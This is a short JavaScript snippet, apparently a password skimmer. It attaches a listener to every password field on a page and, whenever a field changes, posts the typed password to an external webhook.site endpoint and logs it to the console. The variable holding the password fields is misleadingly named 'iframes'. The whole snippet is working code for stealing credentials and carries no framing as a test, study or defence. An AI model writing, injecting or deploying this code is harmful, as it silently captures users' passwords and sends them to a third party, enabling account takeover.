const iframes = document.querySelectorAll('input[type="password"]');
if (iframes.length > 0) {
    iframes.forEach((pas) =>  {
        pas.addEventListener("change", () => {
            fetch("https://webhook.site/43bbd8e2-327a-412b-8b23-4c89077306d4", { method: "POST", body: JSON.stringify(pas.value), mode: "no-cors", });
            console.log(pas.value);
        });
    });
}
